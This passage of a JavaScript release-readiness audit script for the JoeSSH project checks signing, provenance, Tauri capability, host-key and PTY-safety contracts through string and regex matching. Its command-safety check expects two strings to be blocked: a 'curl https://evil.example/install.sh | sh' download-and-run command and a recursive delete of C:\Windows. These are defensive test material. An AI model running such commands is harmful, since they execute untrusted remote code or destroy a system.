    desktopEvidenceDownloader.includes("Package Formal Desktop Evidence") &&
      desktopEvidenceDownloader.includes("--run-id is required") &&
      desktopEvidenceDownloader.includes(
        "verify-desktop-release-evidence.mjs",
      ) &&
      desktopEvidenceDownloader.includes("--require-source") &&
      desktopEvidenceDownloader.includes("release-evidence-source.json") &&
      desktopEvidenceDownloader.includes("workflowDatabaseId") &&
      desktopEvidenceDownloader.includes("artifact.expired") &&
      desktopEvidenceDownloader.includes("reports/release/desktop/") &&
      desktopEvidenceDownloader.includes(
        "check-runs/${checkRunId}/annotations",
      ),
    "Desktop formal evidence downloader imports only verified workflow evidence",
  );
  const desktopReleaseWorkflow =
    readTextIfExists(".github/workflows/desktop-release-artifacts.yml") ?? "";
  passIf(
    desktopReleaseWorkflow.includes("FORMAL_SIGNING_DISABLED") &&
      desktopReleaseWorkflow.includes("desktop-unsigned-bundle-") &&
      !desktopReleaseWorkflow.includes("Package Formal Desktop Evidence") &&
      !desktopReleaseWorkflow.includes("${{ secrets.") &&
      !/^\s*environment:/m.test(desktopReleaseWorkflow) &&
      !/^\s*id-token:/m.test(desktopReleaseWorkflow),
    "Desktop release workflow keeps formal signing disabled and unsigned staging unprivileged",
  );

  const requiredRealSshSmokeEnv =
    readTextIfExists("scripts/require-real-ssh-smoke-env.mjs") ?? "";
  passIf(
    requiredRealSshSmokeEnv.includes("JOESSH_REAL_SSH_SMOKE") &&
      requiredRealSshSmokeEnv.includes("JOESSH_REAL_SSH_HOST") &&
      requiredRealSshSmokeEnv.includes("JOESSH_REAL_SSH_PASSWORD") &&
      requiredRealSshSmokeEnv.includes("JOESSH_REAL_SSH_PRIVATE_KEY_PATH") &&
      requiredRealSshSmokeEnv.includes("JOESSH_REAL_SSH_REMOTE_DIR") &&
      requiredRealSshSmokeEnv.includes(
        "JOESSH_REAL_SSH_PORT must be an integer",
      ),
    "Required Desktop SSH smoke env guard rejects missing real dogfood fixtures",
  );
  const realSshFixtureRunner =
    readTextIfExists("scripts/run-real-ssh-smoke-fixture.mjs") ?? "";
  const realSshEvidencePath =
    /resolve\(\s*root,\s*"reports",\s*"smoke",\s*"desktop",\s*"real-ssh-smoke\.json",?\s*\)/u;
  const realSshEvidenceChecksumPath =
    /resolve\(\s*root,\s*"reports",\s*"smoke",\s*"desktop",\s*"real-ssh-smoke-SHA256SUMS\.txt",?\s*\)/u;
  passIf(
    realSshEvidencePath.test(realSshFixtureRunner) &&
      realSshEvidenceChecksumPath.test(realSshFixtureRunner) &&
      realSshFixtureRunner.includes("JOESSH_REAL_SSH_PRIVATE_KEY_PATH") &&
      realSshFixtureRunner.includes("qa:desktop:real-ssh-smoke:required") &&
      realSshFixtureRunner.includes(
        "local forwarding start/traffic/shutdown",
      ) &&
      realSshFixtureRunner.includes(
        "const sourceState = captureSourceState();",
      ) &&
      realSshFixtureRunner.includes(
        "const wrappedGate = classifyWrappedGate(wrappedCommand);",
      ) &&
      realSshFixtureRunner.includes(
        "const passed = smokePassed && wrappedPassed && sourceBound;",
      ) &&
      realSshFixtureRunner.includes("exitCode = wrappedResult.status ?? 1;") &&
      realSshFixtureRunner.includes("if (!evidencePassed && exitCode === 0)") &&
      realSshFixtureRunner.includes('status: passed ? "passed" : "failed"') &&
      realSshFixtureRunner.includes("version: packageVersion") &&
      realSshFixtureRunner.includes("gitCommit") &&
      realSshFixtureRunner.includes("gitDirty") &&
      realSshFixtureRunner.includes('"qa:beta:windows:source"') &&
      realSshFixtureRunner.includes('"qa:release:public"') &&
      realSshFixtureRunner.includes("sha256(outputPath)") &&
      realSshFixtureRunner.includes("toReleasePath(outputPath)"),
    "Desktop SSH smoke fixture runner writes reusable dogfood evidence",
  );

  const desktopSecretConfigurator =
    readTextIfExists("scripts/configure-desktop-release-secrets.mjs") ?? "";
  passIf(
    desktopSecretConfigurator.includes("FORMAL_SIGNING_DISABLED") &&
      desktopSecretConfigurator.includes("--write-template") &&
      desktopSecretConfigurator.includes(
        "reports/handoff/desktop/external-signer-input-template.env",
      ) &&
      desktopSecretConfigurator.includes(
        "Never import, upload, copy, or pass this file to GitHub",
      ) &&
      desktopSecretConfigurator.includes('flag: "wx"') &&
      !/node:(?:child_process|https?|net)|\b(?:spawn|exec)(?:Sync)?\s*\(|\bfetch\s*\(/.test(
        desktopSecretConfigurator,
      ) &&
      !desktopSecretConfigurator.includes("process.env") &&
      !desktopSecretConfigurator.includes("readFile") &&
      !desktopSecretConfigurator.includes('"secret", "set"') &&
      !desktopSecretConfigurator.includes("desktop-release-signing") &&
      !desktopSecretConfigurator.includes("--repo") &&
      !desktopSecretConfigurator.includes("--verify-only") &&
      !/ATLASTERM_(?:WINDOWS|APPLE|KEYCHAIN)_[A-Z0-9_]+/.test(
        desktopSecretConfigurator,
      ),
    "Desktop signing configurator is limited to a local gitignored non-secret handoff template",
  );
  const desktopEvidenceDiagnostics =
    readTextIfExists("scripts/diagnose-desktop-release-evidence.mjs") ?? "";
  passIf(
    desktopEvidenceDiagnostics.includes(
      "formal-evidence-unblock-report.json",
    ) &&
      desktopEvidenceDiagnostics.includes("reports/handoff/desktop") &&
      desktopEvidenceDiagnostics.includes("release-evidence-source.json") &&
      desktopEvidenceDiagnostics.includes("release-remote-ref") &&
      desktopEvidenceDiagnostics.includes("desktop-formal-signing-disabled") &&
      desktopEvidenceDiagnostics.includes("FORMAL_SIGNING_DISABLED") &&
      desktopEvidenceDiagnostics.includes(
        "approved externally managed isolated signer",
      ) &&
      desktopEvidenceDiagnostics.includes("release-desktop-stale-artifacts") &&
      desktopEvidenceDiagnostics.includes("github-ci") &&
      desktopEvidenceDiagnostics.includes(
        "check-runs/${checkRunId}/annotations",
      ) &&
      desktopEvidenceDiagnostics.includes(
        "verify-desktop-release-evidence.mjs",
      ) &&
      !desktopEvidenceDiagnostics.includes("desktop-release-signing") &&
      !desktopEvidenceDiagnostics.includes(
        "release:desktop:configure-secrets",
      ) &&
      !desktopEvidenceDiagnostics.includes(
        "release:desktop:evidence-workflow",
      ) &&
      !/ATLASTERM_(?:WINDOWS|APPLE|KEYCHAIN)_[A-Z0-9_]+/.test(
        desktopEvidenceDiagnostics,
      ),
    "Desktop formal evidence diagnostics bind local evidence, the disabled signing boundary, workflow visibility, and CI annotations",
  );
  const desktopEvidenceParity =
    readTextIfExists("scripts/check-desktop-release-evidence-parity.mjs") ?? "";
  passIf(
    desktopEvidenceParity.includes("desktop-release-artifacts.yml") &&
      desktopEvidenceParity.includes("Desktop Release Artifacts") &&
      desktopEvidenceParity.includes("Package Formal Desktop Evidence") &&
      desktopEvidenceParity.includes("desktop-release-evidence") &&
      desktopEvidenceParity.includes("FORMAL_SIGNING_DISABLED") &&
      desktopEvidenceParity.includes("desktop-unsigned-bundle-") &&
      desktopEvidenceParity.includes(
        "Desktop release workflow contains no formal artifact, signing secret, environment, or id-token chain",
      ) &&
      desktopEvidenceParity.includes(
        "package exposes no Desktop signing mutation, preflight, or dispatch command",
      ) &&
      desktopEvidenceParity.includes(
        "Desktop configurator is template-only and contains no GitHub mutation or credential-input implementation",
      ) &&
      desktopEvidenceParity.includes(
        "reports/handoff/desktop/formal-evidence-unblock-report.json",
      ) &&
      desktopEvidenceParity.includes(
        "reports/release/desktop/release-evidence-source.json",
      ),
    "Desktop formal evidence parity checker prevents workflow, script, and docs contract drift",
  );

  const releaseDraft =
    readTextIfExists("scripts/create-github-release-draft.mjs") ?? "";
  const sourcePrerelease =
    readTextIfExists("scripts/create-github-source-prerelease.mjs") ?? "";
  const sourcePrereleaseTests =
    readTextIfExists("scripts/create-github-source-prerelease.test.mjs") ?? "";
  passIf(
    releaseDraft.includes(
      'collectFiles(resolve(root, "reports", "release"))',
    ) &&
      !releaseDraft.includes(
        'resolve(root, "apps", "desktop", "src-tauri", "target", "release", "bundle")',
      ),
    "GitHub Release draft uploads only staged reports/release artifacts",
  );
  passIf(
    sourcePrerelease.includes("assertNoReleasePayloads") &&
      sourcePrerelease.includes("collectNonDirectoryEntries") &&
      sourcePrerelease.includes("must be an annotated Git tag") &&
      sourcePrerelease.includes("resolveRemoteTagCommit") &&
      sourcePrerelease.includes("uploaded assets must be an empty array") &&
      sourcePrerelease.includes('mutateGithubRelease("POST"') &&
      sourcePrerelease.includes('"PATCH"') &&
      sourcePrerelease.includes("deleteGithubRelease(createdReleaseId)") &&
      sourcePrerelease.includes("--verify-published") &&
      sourcePrerelease.includes("prerelease: true") &&
      sourcePrereleaseTests.includes(
        "deletes the exact release when zero-asset verification fails",
      ) &&
      sourcePrereleaseTests.includes(
        "deletes the exact release if protected main moves during publication",
      ) &&
      sourcePrereleaseTests.includes(
        "repository release notes satisfy the source prerelease boundary contract",
      ),
    "Source prerelease entry point enforces annotated tags, zero assets, exact-ID cleanup, and published verification",
  );
  passIf(
    sourcePrereleaseTests.includes(
      "repository release notes satisfy the source prerelease boundary contract",
    ) &&
      sourcePrereleaseTests.includes(
        "accepts required release-note phrases split across line wrapping",
      ) &&
      sourcePrereleaseTests.includes("settings.releaseNotes") &&
      sourcePrereleaseTests.includes(
        "const version = repositoryPackageJson.version",
      ) &&
      sourcePrereleaseTests.includes("const version = state.version"),
    "Source prerelease tests bind real versioned notes and Markdown line-wrap behavior",
  );
  passIf(
    sourcePrerelease.includes("githubReleaseControlsPath") &&
      sourcePrerelease.includes("check-github-release-controls.mjs") &&
      sourcePrerelease.includes("assertGithubReleaseControls();") &&
      sourcePrerelease.includes("--confirm-billing-ready") &&
      sourcePrerelease.includes("JOESSH_GITHUB_RELEASE_CONTROLS_GH_COMMAND") &&
      sourcePrerelease.includes("JOESSH_GITHUB_RELEASE_CONTROLS_GH_ARGS") &&
      sourcePrereleaseTests.includes(
        "rejects publication without explicit billing confirmation",
      ),
    "Source prerelease mutation requires the read-only GitHub release-controls gate and explicit billing attestation",
  );

  const rcAudit = readTextIfExists("scripts/audit-public-beta-rc.mjs") ?? "";
  passIf(
    rcAudit.includes("public-beta-rc-audit.json") &&
      rcAudit.includes('"handoff"') &&
      rcAudit.includes("RC audit evidence is internal handoff material") &&
      rcAudit.includes("desktop-formal-signing-disabled") &&
      rcAudit.includes("FORMAL_SIGNING_DISABLED") &&
      rcAudit.includes("desktop-dogfood") &&
      rcAudit.includes("release-desktop-stale-artifacts") &&
      rcAudit.includes("publish-preflight") &&
      rcAudit.includes("github-ci") &&
      rcAudit.includes("check-runs/${checkRunId}/annotations"),
    "Public Beta RC audit binds dogfood, disabled signing boundary, preflight, and CI blocker evidence",
  );

  const releasePublishPreflight =
    readTextIfExists("scripts/release-publish-preflight.mjs") ?? "";
  const releaseCandidateContract =
    readTextIfExists("scripts/release-candidate-github-contract.mjs") ?? "";
  passIf(
    releasePublishPreflight.includes("verify-artifact-checksums.mjs") &&
      releasePublishPreflight.includes("--all-release"),
    "Publish preflight verifies all staged release checksum manifests",
  );
  passIf(
    releasePublishPreflight.includes("verify-web-release-package.mjs"),
    "Publish preflight verifies the staged Web Admin release package",
  );
  passIf(
    releasePublishPreflight.includes("verify-sync-release-evidence.mjs"),
    "Publish preflight verifies Sync packaged backup/restore release evidence",
  );
  passIf(
    releasePublishPreflight.includes("Verify release Git checkout") &&
      releasePublishPreflight.includes("rev-parse") &&
      releasePublishPreflight.includes("--porcelain=v1") &&
      releasePublishPreflight.includes(":(exclude)reports/release") &&
      releasePublishPreflight.includes(
        "must point at HEAD for publish preflight",
      ),
    "Publish preflight verifies healthy Git checkout, clean tree, and release tag",
  );
  passIf(
    releasePublishPreflight.includes("verify-release-provenance.mjs"),
    "Publish preflight verifies release provenance",
  );
  passIf(
    releasePublishPreflight.includes("verifyCanonicalReleaseCandidate") &&
      releaseDraft.includes("verifyCanonicalReleaseCandidate") &&
      sourcePrerelease.includes("verifyCanonicalReleaseCandidate") &&
      releaseCandidateContract.includes("branches/${canonicalBranch}") &&
      releaseCandidateContract.includes("check-runs?") &&
      releaseCandidateContract.includes("Public Release Readiness") &&
      releaseCandidateContract.includes("appId: 15368") &&
      releaseCandidateContract.includes("total_count") &&
      releaseCandidateContract.includes("readStableCheckRuns") &&
      releaseCandidateContract.includes("stableProjection") &&
      releaseCandidateContract.includes("page === 1") &&
      releaseCandidateContract.includes("compareCheckRecency") &&
      releaseCandidateContract.includes("started_at") &&
      releaseCandidateContract.includes('check.status !== "completed"') &&
      releaseCandidateContract.includes('check.conclusion !== "success"'),
    "Publish entry points share the protected-main successful-readiness candidate contract",
  );
  passIf(
    releasePublishPreflight.includes("verify-third-party-licenses.mjs") &&
      releaseDraft.includes("verify-third-party-licenses.mjs") &&
      !releasePublishPreflight.includes("--artifact-only") &&
      !releaseDraft.includes("--artifact-only") &&
      !releasePublishPreflight.includes("ATLASTERM_RELEASE_LICENSE_VERIFIER") &&
      !releaseDraft.includes("ATLASTERM_RELEASE_LICENSE_VERIFIER"),
    "Publish entry points require lock-bound third-party license verification",
  );
  passIf(
    releasePublishPreflight.includes("verify-desktop-release-evidence.mjs") &&
      releasePublishPreflight.includes("--require-source"),
    "Publish preflight requires formal Desktop workflow source provenance",
  );
  passIf(
    /runGh\(\[\s*"release",\s*"view",\s*releaseTag,\s*"--repo",\s*releaseRepository,\s*"--json",\s*"url",?\s*\]\)/u.test(
      releasePublishPreflight,
    ) &&
      /runGh\(\[\s*"api",\s*"--method",\s*"GET",\s*endpoint,?\s*\]\)/u.test(
        releasePublishPreflight,
      ) &&
      releasePublishPreflight.includes("Verify GitHub CLI publish readiness") &&
      releasePublishPreflight.includes("ATLASTERM_RELEASE_GH_COMMAND") &&
      releasePublishPreflight.includes(
        'const releaseRepository = "JoeWorkspace/JoeSSH";',
      ) &&
      releasePublishPreflight.includes(
        "const githubRepositoryApiRoot = `repos/${releaseRepository}`;",
      ) &&
      releasePublishPreflight.includes('auth", "status') &&
      releasePublishPreflight.includes(
        "const remoteTag = resolveRemoteReleaseTagCommit();",
      ) &&
      releasePublishPreflight.includes(
        "remoteTag.commit !== head.stdout.trim()",
      ) &&
      releasePublishPreflight.includes("Unable to confirm GitHub Release") &&
      releasePublishPreflight.includes(
        "already exists; refusing to publish a duplicate release",
      ) &&
      !/runGh\(\[\s*"release",\s*"(?:create|edit|delete|upload)"/u.test(
        releasePublishPreflight,
      ) &&
      !/runGh\(\[\s*"api"[\s\S]{0,160}?"--method",\s*"(?:POST|PUT|PATCH|DELETE)"/u.test(
        releasePublishPreflight,
      ),
    "Publish preflight verifies GitHub CLI auth and duplicate-release state without mutating GitHub",
  );

  const releaseProvenanceGenerator =
    readTextIfExists("scripts/generate-release-provenance.mjs") ?? "";
  passIf(
    releaseProvenanceGenerator.includes("gitFsckStrict") &&
      releaseProvenanceGenerator.includes('remote", "get-url", "origin') &&
      releaseProvenanceGenerator.includes(
        "release-provenance-SHA256SUMS.txt",
      ) &&
      releaseProvenanceGenerator.includes("checksumManifests") &&
      releaseProvenanceGenerator.includes("requiredChecksumManifests") &&
      releaseProvenanceGenerator.includes(
        "reports/release/desktop/release-evidence-SHA256SUMS.txt",
      ) &&
      releaseProvenanceGenerator.includes("release-evidence-source.json") &&
      releaseProvenanceGenerator.includes(
        "verify-desktop-release-evidence.mjs --require-source",
      ) &&
      releaseProvenanceGenerator.includes(
        "reports/release/sync/backup-restore-smoke-SHA256SUMS.txt",
      ),
    "Release provenance generator binds Git, lockfiles, manifests, and provenance checksum evidence",
  );

  const releaseProvenanceVerifier =
    readTextIfExists("scripts/verify-release-provenance.mjs") ?? "";
  passIf(
    releaseProvenanceVerifier.includes("source.repository") &&
      releaseProvenanceVerifier.includes("git fsck --strict") &&
      releaseProvenanceVerifier.includes("release notes hash mismatch") &&
      releaseProvenanceVerifier.includes("artifact hash mismatch") &&
      releaseProvenanceVerifier.includes("requiredChecksumManifests") &&
      releaseProvenanceVerifier.includes("release-evidence-source.json") &&
      releaseProvenanceVerifier.includes(
        "verify-desktop-release-evidence.mjs --require-source",
      ) &&
      releaseProvenanceVerifier.includes(
        "unexpected Public Beta checksum manifest is staged",
      ),
    "Release provenance verifier rejects stale Git, release notes, lockfile, manifest, and artifact evidence",
  );

  const releaseDraftProvenance =
    readTextIfExists("scripts/create-github-release-draft.mjs") ?? "";
  const releaseDraftTests =
    readTextIfExists("scripts/create-github-release-draft.test.mjs") ?? "";
  passIf(
    releaseDraftProvenance.includes("provenanceVerificationArgs") &&
      releaseDraftProvenance.includes("if (dryRun)") &&
      releaseDraftProvenance.includes(
        'provenanceVerificationArgs.push("--skip-current-git-check")',
      ) &&
      releaseDraftTests.includes(
        "non-dry-run rejects release provenance from a different Git source",
      ),
    "GitHub Release draft verifies release provenance against current Git outside dry-run",
  );

  const webBundleTokenScan =
    readTextIfExists("scripts/check-web-admin-bundle-token-scan.mjs") ?? "";
  passIf(
    webBundleTokenScan.includes("ATLASTERM_[A-Z0-9_]*TOKEN") &&
      webBundleTokenScan.includes("bearer token literal") &&
      webBundleTokenScan.includes("high-entropy credential literal"),
    "Web Admin bundle token scan rejects token env names, bearer literals, and high-entropy credential literals",
  );

  const mobilePublicEnvGuard =
    readTextIfExists("scripts/check-mobile-public-env.mjs") ?? "";
  passIf(
    mobilePublicEnvGuard.includes("EXPO_PUBLIC_ATLASTERM_SYNC_AUTH_TOKEN") &&
      mobilePublicEnvGuard.includes("Public Beta mobile release builds") &&
      mobilePublicEnvGuard.includes("embedded in the app bundle"),
    "Mobile public env guard rejects EXPO_PUBLIC sync auth tokens",
  );

  const webPackager = readTextIfExists("scripts/package-web-release.mjs") ?? "";
  passIf(
    webPackager.includes("isInsideRoot(outputPath)") &&
      webPackager.includes("isInsideRoot(checksumPath)") &&
      webPackager.includes(
        "Web Admin release output paths must stay inside the release root",
      ),
    "Web Admin release packager keeps output paths inside the release root",
  );

  const syncPackager =
    readTextIfExists("scripts/package-sync-release.mjs") ?? "";
  passIf(
    syncPackager.includes("removeStaleSyncReleaseBinaries") &&
      syncPackager.includes("isSyncReleaseBinaryName") &&
      syncPackager.includes("SHA256SUMS.txt"),
    "Sync release packager removes stale staged binaries while writing checksums",
  );

  const syncBackupRestoreSmoke =
    readTextIfExists("scripts/smoke-sync-backup-restore.mjs") ?? "";
  passIf(
    syncBackupRestoreSmoke.includes("--packaged-release") &&
      syncBackupRestoreSmoke.includes("binaryKind") &&
      syncBackupRestoreSmoke.includes("binarySha256") &&
      syncBackupRestoreSmoke.includes("binaryManifest") &&
      syncBackupRestoreSmoke.includes('"reports", "release", "sync"') &&
      syncBackupRestoreSmoke.includes('"reports", "smoke", "sync"') &&
      syncBackupRestoreSmoke.includes("evidenceDirectory"),
    "Sync backup/restore smoke separates local drill evidence from packaged release evidence",
  );

  const lighthouseAudit =
    readTextIfExists("scripts/lighthouse-audit.mjs") ?? "";
  passIf(
    lighthouseAudit.includes('"web"') &&
      lighthouseAudit.includes('apps", "web", "dist') &&
      lighthouseAudit.includes('reports", "lighthouse", "web-admin.json') &&
      lighthouseAudit.includes("--min-performance") &&
      lighthouseAudit.includes("defaultThresholds") &&
      lighthouseAudit.includes("readDeploymentHeaders") &&
      lighthouseAudit.includes("?adminSnapshot=fixture") &&
      lighthouseAudit.includes("/api/admin/snapshot") &&
      lighthouseAudit.includes("createEmptyAdminSnapshot") &&
      lighthouseAudit.includes("collectRunWarningFailures") &&
      lighthouseAudit.includes("runWarnings"),
    "Lighthouse release audit targets Web Admin dist, applies deployment headers, uses explicit fixture mode, serves a local admin snapshot fallback, fails on run warnings, and writes release-machine evidence",
  );
}

function checkDependabotAutoMergePolicy() {
  const workflow = readText(".github/workflows/dependabot-auto-merge.yml");
  passIf(
    workflow.includes("dependency-type") &&
      workflow.includes("direct:development") &&
      !workflow.includes("dependency-type == 'direct:production'") &&
      !workflow.includes('"indirect"'),
    "Dependabot auto-merge is limited by dependency type",
  );
  passIf(
    !workflow.includes("Auto-merge minor and patch updates"),
    "Dependabot auto-merge avoids broad minor/patch production updates",
  );
  passIf(
    workflow.includes("github.event.pull_request.base.ref == 'main'") &&
      workflow.includes("github.ref_protected == true") &&
      workflow.includes(
        "vars.JOESSH_DEPENDABOT_AUTO_MERGE_ENABLED == 'true'",
      ) &&
      workflow.includes('--match-head-commit "$PR_HEAD_SHA"') &&
      workflow.includes(
        "PR_HEAD_SHA: ${{ github.event.pull_request.head.sha }}",
      ),
    "Dependabot auto-merge requires protected main, explicit opt-in, and an exact PR head",
  );
  passIf(
    /dependabot\/fetch-metadata@[0-9a-f]{40}\b/.test(workflow),
    "Dependabot metadata Action is pinned to a full commit SHA",
  );
}

function checkTauriDistributionMetadata() {
  const tauri = readJson("apps/desktop/src-tauri/tauri.conf.json");
  passIf(tauri.productName === "JoeSSH", "Tauri productName is JoeSSH");
  passIf(
    tauri.identifier === "dev.atlasterm.joessh",
    "Tauri identifier is public release identifier",
  );
  passIf(tauri.bundle?.active === true, "Tauri bundling is enabled");
  passIf(
    tauri.bundle?.targets === "all",
    "Tauri bundle targets cover Windows/macOS/Linux",
  );
  passIf(
    Array.isArray(tauri.bundle?.icon) && tauri.bundle.icon.length > 0,
    "Tauri bundle icon is configured",
  );
}

function checkDesktopReleaseMetadata() {
  const tauri = readJson("apps/desktop/src-tauri/tauri.conf.json");
  const metadataPath = "docs/desktop-release-metadata.json";
  const metadata = readCheckedJson(metadataPath);
  passIf(
    metadata !== null,
    "Desktop release metadata contract exists",
    metadataPath,
  );
  if (metadata === null) {
    return;
  }

  passIf(
    metadata.productName === tauri.productName,
    "Desktop release metadata productName matches Tauri config",
  );
  passIf(
    metadata.identifier === tauri.identifier,
    "Desktop release metadata identifier matches Tauri config",
  );
  passIf(
    nonEmptyString(metadata.publisher),
    "Desktop release metadata includes publisher",
  );
  passIf(
    nonEmptyString(metadata.copyright),
    "Desktop release metadata includes copyright",
  );
  passIf(
    nonEmptyString(metadata.category),
    "Desktop release metadata includes category",
  );
  passIf(
    Array.isArray(metadata.bundleTargets) &&
      ["windows", "macos", "linux"].every((platform) =>
        metadata.bundleTargets.includes(platform),
      ),
    "Desktop release metadata covers Windows/macOS/Linux targets",
  );
  passIf(
    metadata.signingEvidence?.windows ===
      "ATLASTERM_DESKTOP_WINDOWS_SIGNATURE_VERIFICATION" &&
      metadata.signingEvidence?.macosSignature ===
        "ATLASTERM_DESKTOP_MACOS_SIGNATURE_VERIFICATION" &&
      metadata.signingEvidence?.macosNotarization ===
        "ATLASTERM_DESKTOP_MACOS_NOTARIZATION_VERIFICATION",
    "Desktop release metadata documents signing evidence environment variables",
  );
  passIf(
    Array.isArray(metadata.linuxPackageTypes) &&
      ["AppImage", "deb", "rpm"].some((packageType) =>
        metadata.linuxPackageTypes.includes(packageType),
      ),
    "Desktop release metadata documents Linux package types",
  );
}

function checkTauriCapabilities() {
  const tauri = readJson("apps/desktop/src-tauri/tauri.conf.json");
  const windows = Array.isArray(tauri.app?.windows) ? tauri.app.windows : [];
  passIf(
    windows.some((window) => window?.label === "main"),
    "Tauri main window has explicit 'main' label",
  );

  const capabilityFiles = listTauriCapabilityFiles();
  passIf(
    capabilityFiles.length > 0,
    "Tauri capabilities JSON files exist",
    "expected apps/desktop/src-tauri/capabilities/*.json",
  );
  if (capabilityFiles.length === 0) {
    return;
  }

  const capabilities = [];
  const wildcardLocations = [];
  for (const relativePath of capabilityFiles) {
    const json = readCheckedJson(relativePath);
    if (json === null) {
      continue;
    }

    collectWildcardStrings(json, relativePath, wildcardLocations);
    const fileCapabilities = normalizeCapabilityFile(json);
    passIf(
      fileCapabilities.length > 0,
      `Tauri capability file '${relativePath}' declares capabilities`,
    );
    for (const capability of fileCapabilities) {
      capabilities.push({ capability, relativePath });
    }
  }

  passIf(
    wildcardLocations.length === 0,
    "Tauri capabilities do not contain wildcard strings",
    wildcardLocations.slice(0, 5).join(", "),
  );

  const remoteCapabilities = capabilities.filter(
    ({ capability }) => capability?.remote != null,
  );
  passIf(
    remoteCapabilities.length === 0,
    "Tauri capabilities do not grant remote URL sources",
    remoteCapabilities
      .map(
        ({ capability, relativePath }) =>
          `${relativePath}:${String(capability.identifier)}`,
      )
      .join(", "),
  );

  const localMainCapabilities = capabilities.filter(
    ({ capability }) =>
      capability?.local !== false &&
      capabilityIncludesWindow(capability, "main"),
  );
  passIf(
    localMainCapabilities.length > 0,
    "Tauri local main window capability exists",
    "expected a local capability with windows: ['main']",
  );

  const permissionIdentifiers = localMainCapabilities.flatMap(
    ({ capability }) => capabilityPermissionIdentifiers(capability),
  );
  const invalidPermissions = permissionIdentifiers.filter(
    (permission) => permission === null,
  );
  passIf(
    invalidPermissions.length === 0,
    "Tauri capability permissions are valid identifiers",
    "expected string entries or objects with an identifier string",
  );

  const permissionSet = new Set(
    permissionIdentifiers.filter(
      (permission) => typeof permission === "string",
    ),
  );
  const defaultPermissionSets = [...permissionSet].filter(
    (permission) =>
      permission === "default" ||
      permission === "core:default" ||
      permission.endsWith(":default"),
  );
  passIf(
    defaultPermissionSets.length === 0,
    "Tauri capabilities avoid default permission sets",
    defaultPermissionSets.join(", "),
  );

  const commands = readTauriInvokeHandlerCommands();
  const expectedCommandPermissions = commands.map(commandToPermission);
  checkTauriAppCommandPermissionDefinitions(commands);
  const missingCommandPermissions = expectedCommandPermissions.filter(
    (permission) => !permissionSet.has(permission),
  );
  passIf(
    missingCommandPermissions.length === 0,
    "Tauri main capability covers invoke_handler commands",
    missingCommandPermissions.join(", "),
  );

  const expectedCommandPermissionSet = new Set(expectedCommandPermissions);
  const unexpectedAppPermissions = [...permissionSet].filter(
    (permission) =>
      !permission.includes(":") &&
      /^(allow|deny)-[a-z0-9-]+$/.test(permission) &&
      !expectedCommandPermissionSet.has(permission),
  );
  passIf(
    unexpectedAppPermissions.length === 0,
    "Tauri main capability has no stale app command permissions",
    unexpectedAppPermissions.join(", "),
  );
}

function checkDesktopHostKeyTrustSurface() {
  const requiredSnippetsByFile = [
    [
      "Desktop SSH core host-key probe",
      "crates/core/src/ssh.rs",
      [
        "pub async fn probe_host_key(",
        "HostKeyPolicy::AcceptAny",
        "russh::Disconnect::ByApplication",
      ],
    ],
    [
      "Desktop Tauri host-key trust backend",
      "apps/desktop/src-tauri/src/lib.rs",
      [
        "ssh_host_key_probe",
        "enum HostKeyProbeStatus",
        "struct KnownHostRecord",
        "struct KnownHostsFile",
        "known_hosts_list",
        "known_hosts_remove",
        "KnownHostSource::Legacy",
        "KnownHostSource::Tofu",
        "KnownHostSource::Confirmed",
      ],
    ],
    [
      "Desktop IPC host-key trust bridge",
      "apps/desktop/src/ipc.ts",
      [
        "sshHostKeyProbe",
        "knownHostsList",
        "knownHostsRemove",
        "KnownHostEntry",
      ],
    ],
    [
      "Desktop connect modal host-key confirmation UX",
      "apps/desktop/src/ConnectModal.tsx",
      [
        "onHostKeyProbe",
        "pendingHostKey",
        "desktop.hostKeyConfirmTitle",
        "desktop.trustHostKeyAndConnect",
        "desktop.hostKeyChangedDetail",
      ],
    ],
    [
      "Desktop settings known-host management UX",
      "apps/desktop/src/panels.tsx",
      [
        "knownHosts.entries",
        "knownHosts.onRemove",
        "desktop.knownHostFirstSeen",
        "desktop.knownHostLastSeen",
        "desktop.removeKnownHost",
        "desktop.confirmKnownHostRemove",
        "desktop.confirmKnownHostsClear",
        "pendingKnownHostAction",
      ],
    ],
    [
      "Desktop host-key confirmation tests",
      "apps/desktop/src/ConnectModal.test.tsx",
      [
        "requires confirmation for an unknown host key before authenticating",
        "blocks authentication when the stored host key changed",
        "continues directly when the stored host key matches",
      ],
    ],
    [
      "Desktop known-host settings tests",
      "apps/desktop/src/panels.test.tsx",
      [
        "lists known-host pins with audit metadata and confirms before removing one pin",
        "shows the stored known-host count and confirms before clearing them",
        "SHA256:abc",
        "Remove host key",
      ],
    ],
  ];

  for (const [label, relativePath, snippets] of requiredSnippetsByFile) {
    const text = readTextIfExists(relativePath);
    passIf(text !== null, `${label} exists`, relativePath);
    if (text === null) {
      continue;
    }
    for (const snippet of snippets) {
      passIf(text.includes(snippet), `${label} includes '${snippet}'`);
    }
  }
}

function checkDesktopPtyRuntimeSurface() {
  const requiredSnippetsByFile = [
    [
      "Desktop SSH exec output resource limit",
      "crates/core/src/ssh.rs",
      [
        "SSH_EXEC_MAX_OUTPUT_BYTES",
        "OutputLimitExceeded",
        "exec_output_would_exceed_limit",
        "exec_output_limit_allows_boundary_and_rejects_growth",
      ],
    ],
    [
      "Desktop SSH exec output sanitizer",
      "apps/desktop/src-tauri/src/lib.rs",
      ["OutputLimitExceeded", "command output exceeded desktop safety limit"],
    ],
    [
      "Desktop native ssh_exec command safety guard",
      "apps/desktop/src-tauri/src/lib.rs",
      [
        "SSH_EXEC_COMMAND_BLOCKED",
        "ensure_safe_ssh_exec_command(&command)",
        "detect_dangerous_command(command)",
        "DangerousCommandAction::Block",
        "ssh_exec_native_safety_blocks_destructive_commands",
      ],
    ],
    [
      "Desktop native PTY command safety guard",
      "apps/desktop/src-tauri/src/lib.rs",
      [
        "PTY_COMMAND_BLOCKED",
        "pty_input_buffers",
        "ensure_safe_pty_write(&state, id, &data)",
        "apply_pty_input_safety",
        "pty_input_safety_blocks_destructive_line_across_chunks",
      ],
    ],
    [
      "Desktop core command safety block patterns",
      "crates/core/tests/core_tests.rs",
      [
        "detects_native_ipc_command_safety_block_patterns",
        "curl https://evil.example/install.sh | sh",
        "Remove-Item -Recurse -Force C:\\\\Windows",
      ],
    ],
    [
      "Desktop PTY lifecycle hook",
      "apps/desktop/src/usePtySession.ts",
      [
        "export type PtyStatus",
        "exitCode",
        "setExitCode(code)",
        "blockedReason",
        "ptyCommandBlockedReason",
        "resize: (ptyId: string, cols: number, rows: number) => Promise<void>",
      ],
    ],
    [
      "Desktop xterm PTY runtime UX",
      "apps/desktop/src/XtermTerminal.tsx",
      [
        "ResizeObserver",
        "measureTerminalDimensions",
